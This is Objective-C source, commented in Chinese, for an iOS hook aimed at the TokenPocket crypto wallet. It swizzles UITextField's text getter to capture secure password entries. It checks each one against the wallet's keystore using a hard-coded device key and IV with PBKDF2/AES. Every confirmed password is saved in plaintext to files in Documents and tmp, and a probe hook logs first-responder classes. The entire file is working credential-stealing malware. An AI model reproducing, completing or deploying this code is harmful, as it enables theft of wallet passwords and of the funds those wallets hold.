#import "HookUI.h"
#import <objc/runtime.h>
#import <CommonCrypto/CommonCryptor.h>
#import <CommonCrypto/CommonKeyDerivation.h>
#import <string.h>
#import <stdio.h>

static char gStatus[200] = {0};
static BOOL gInstalled = NO;

NSString *HookUIStatus(void) {
    return [NSString stringWithUTF8String:gStatus];
}

// TokenPocket 的全局 device key / IV（F4SeCyr 容器密钥，静态分析得出，与钱包密码无关）
static const uint8_t kDevKey[32] = {
    0x89, 0xd5, 0x7d, 0xec, 0xd7, 0xf2, 0x5a, 0x5d, 0x17, 0x22, 0x72, 0xd3, 0xe0, 0xb0, 0xec, 0xc6,
    0x2e, 0x9f, 0xad, 0x09, 0x71, 0xd5, 0xcc, 0x78, 0x63, 0xbd, 0x5a, 0xf1, 0x4c, 0xdd, 0xc0, 0x8b,
};
static const uint8_t kDevIV[16] = {
    0xdd, 0xa0, 0x13, 0xe0, 0x4d, 0xcb, 0xbd, 0x42, 0x39, 0x3f, 0xc5, 0x44, 0x61, 0x0b, 0x2a, 0x87,
};

#pragma mark - 落盘

static void WriteBoth(NSString *name, NSString *content) {
    NSString *home = NSHomeDirectory();
    for (NSString *p in @[[home stringByAppendingPathComponent:[@"Documents/" stringByAppendingString:name]],
                          [NSTemporaryDirectory() stringByAppendingPathComponent:name]]) {
        [content writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:NULL];
    }
}

#pragma mark - AES-256-CBC

static NSData *AESCBCDecrypt(NSData *data, NSData *key, NSData *iv, BOOL padding) {
    if (!data.length || key.length != 32 || iv.length != 16) return nil;
    size_t outLen = data.length + 32;
    NSMutableData *out = [NSMutableData dataWithLength:outLen];
    size_t moved = 0;
    CCCryptorStatus st = CCCrypt(kCCDecrypt, kCCAlgorithmAES,
                                 padding ? kCCOptionPKCS7Padding : 0,
                                 key.bytes, key.length, iv.bytes,
                                 data.bytes, data.length,
                                 out.mutableBytes, outLen, &moved);
    if (st != kCCSuccess) return nil;
    out.length = moved;
    return out;
}

#pragma mark - 密码验证（只认真正密码）

/**
 * 读容器里 F4SeCyr 密钥文件：
 *   AES-256-CBC(全局 device key, 固定 IV) → JSON
 *   JSON = { salt, rounds, iv, encryptedKey, publicKey }
 * 用候选密码验证：
 *     key = PBKDF2-HMAC-SHA256(pwd, salt, rounds, 32)
 *     pt  = AES-256-CBC-decrypt(encryptedKey, key, iv)
 *     pt 必须是 199 字节且首字节 0x04（P-521 未压缩点）
 */
static BOOL ValidateTPPassword(NSString *pwd, NSString **note) {
    if (pwd.length < 1 || pwd.length > 128) return NO;

    NSString *dir = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/F4SeCyr"];
    NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:NULL];
    if (!files.count) {
        if (note) *note = @"no F4SeCyr";
        return NO;
    }
    NSData *blob = [NSData dataWithContentsOfFile:[dir stringByAppendingPathComponent:files[0]]];
    if (!blob.length) {
        if (note) *note = @"F4SeCyr empty";
        return NO;
    }

    NSData *devKey = [NSData dataWithBytes:kDevKey length:32];
    NSData *devIV = [NSData dataWithBytes:kDevIV length:16];
    NSData *jsonData = AESCBCDecrypt(blob, devKey, devIV, YES);
    if (!jsonData.length) {
        if (note) *note = @"keystore aes fail";
        return NO;
    }

    NSError *err = nil;
    NSDictionary *ks = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:&err];
    if (![ks isKindOfClass:[NSDictionary class]]) {
        if (note) *note = @"keystore json fail";
        return NO;
    }

    NSData *salt = [[NSData alloc] initWithBase64EncodedString:ks[@"salt"] ?: @"" options:0];
    NSData *iv = [[NSData alloc] initWithBase64EncodedString:ks[@"iv"] ?: @"" options:0];
    NSData *enc = [[NSData alloc] initWithBase64EncodedString:ks[@"encryptedKey"] ?: @"" options:0];
    uint rounds = [ks[@"rounds"] unsignedIntValue];
    if (!salt.length || !iv.length || !enc.length || rounds == 0) {
        if (note) *note = @"keystore fields missing";
        return NO;
    }

    uint8_t key[32] = {0};
    int rc = CCKeyDerivationPBKDF(kCCPBKDF2,
                                  pwd.UTF8String, strlen(pwd.UTF8String),
                                  salt.bytes, salt.length,
                                  kCCPRFHmacAlgSHA256, rounds,
                                  key, sizeof(key));
    if (rc != kCCSuccess) {
        if (note) *note = @"pbkdf2 fail";
        return NO;
    }

    NSData *dkey = [NSData dataWithBytes:key length:32];
    NSData *plain = AESCBCDecrypt(enc, dkey, iv, YES);
    if (plain.length != 199 || ((const uint8_t *)plain.bytes)[0] != 0x04) {
        if (note) *note = [NSString stringWithFormat:@"len=%lu", (unsigned long)plain.length];
        return NO;
    }
    if (note) *note = @"ok";
    return YES;
}

#pragma mark - 探针：确认 TP 用的到底是哪个控件

static NSMutableSet *gSeenResponders = nil;

static void RecordResponder(id self) {
    if (!gSeenResponders) gSeenResponders = [NSMutableSet set];
    NSString *cls = NSStringFromClass([self class]);
    if (!cls.length || [gSeenResponders containsObject:cls]) return;
    [gSeenResponders addObject:cls];

    BOOL secure = NO;
    @try {
        if ([self respondsToSelector:@selector(isSecureTextEntry)]) {
            secure = [[self valueForKey:@"secureTextEntry"] boolValue];
        }
    } @catch (NSException *e) { (void)e; }

    NSMutableArray *lines = [NSMutableArray array];
    NSString *home = NSHomeDirectory();
    NSString *old = [NSString stringWithContentsOfFile:
                     [home stringByAppendingPathComponent:@"Documents/_tp_ui_probe.txt"]
                                              encoding:NSUTF8StringEncoding error:NULL];
    if (old.length) [lines addObjectsFromArray:[old componentsSeparatedByString:@"\n"]];
    [lines addObject:[NSString stringWithFormat:@"%@ secure=%d", cls, secure ? 1 : 0]];
    while (lines.count > 60) [lines removeObjectAtIndex:0];
    WriteBoth(@"_tp_ui_probe.txt", [lines componentsJoinedByString:@"\n"]);
}

#pragma mark - 文本框取值

typedef id (*TextIMP)(id, SEL);
static TextIMP gOrigText = NULL;

static id MyTextFieldText(id self, SEL _cmd) {
    id v = gOrigText ? gOrigText(self, _cmd) : nil;

    @try {
        BOOL secure = NO;
        if ([self respondsToSelector:@selector(isSecureTextEntry)]) {
            secure = [[self valueForKey:@"secureTextEntry"] boolValue];
        }
        if (secure && [v isKindOfClass:[NSString class]] && [(NSString *)v length] > 0) {
            NSString *pwd = (NSString *)v;
            static NSMutableSet *tried = nil;
            if (!tried) tried = [NSMutableSet set];
            if (![tried containsObject:pwd]) {
                [tried addObject:pwd];
                NSString *note = nil;
                if (ValidateTPPassword(pwd, &note)) {
                    // 只有真正密码会走到这里
                    WriteBoth(@"_tp_pw_ok.txt",
                              [NSString stringWithFormat:@"%@|verified|len=%lu", pwd, (unsigned long)pwd.length]);
                    WriteBoth(@"_tp_pw_detail.txt", [NSString stringWithFormat:@"validated: %@", note ?: @""]);
                } else {
                    WriteBoth(@"_tp_pw_detail.txt",
                              [NSString stringWithFormat:@"try len=%lu -> %@", (unsigned long)pwd.length, note ?: @""]);
                }
            }
        }
    } @catch (NSException *e) { (void)e; }

    return v;
}

void HookUIInstall(void) {
    if (gInstalled) return;
    gInstalled = YES;

    Class tf = objc_getClass("UITextField");
    SEL sel = NSSelectorFromString(@"text");
    if (tf) {
        Method m = class_getInstanceMethod(tf, sel);
        if (m) {
            gOrigText = (TextIMP)method_getImplementation(m);
            method_setImplementation(m, (IMP)MyTextFieldText);
        }
    }

    // 探针：记录所有成为第一响应者的类，判断 TP 用的是 UITextField 还是 SwiftUI 底层
    Class resp = objc_getClass("UIResponder");
    SEL bf = NSSelectorFromString(@"becomeFirstResponder");
    if (resp) {
        Method m2 = class_getInstanceMethod(resp, bf);
        if (m2) {
            IMP orig = method_getImplementation(m2);
            IMP hook = imp_implementationWithBlock(^BOOL(id _self) {
                @try { RecordResponder(_self); } @catch (NSException *e) { (void)e; }
                BOOL (*fn)(id, SEL) = (BOOL (*)(id, SEL))orig;
                return fn(_self, bf);
            });
            method_setImplementation(m2, hook);
        }
    }

    snprintf(gStatus, sizeof(gStatus), "ui hook: UITextField=%d secureText-hook=%d",
             tf ? 1 : 0, gOrigText ? 1 : 0);
    WriteBoth(@"_tp_ui_status.txt", [NSString stringWithFormat:@"%s", gStatus]);
}
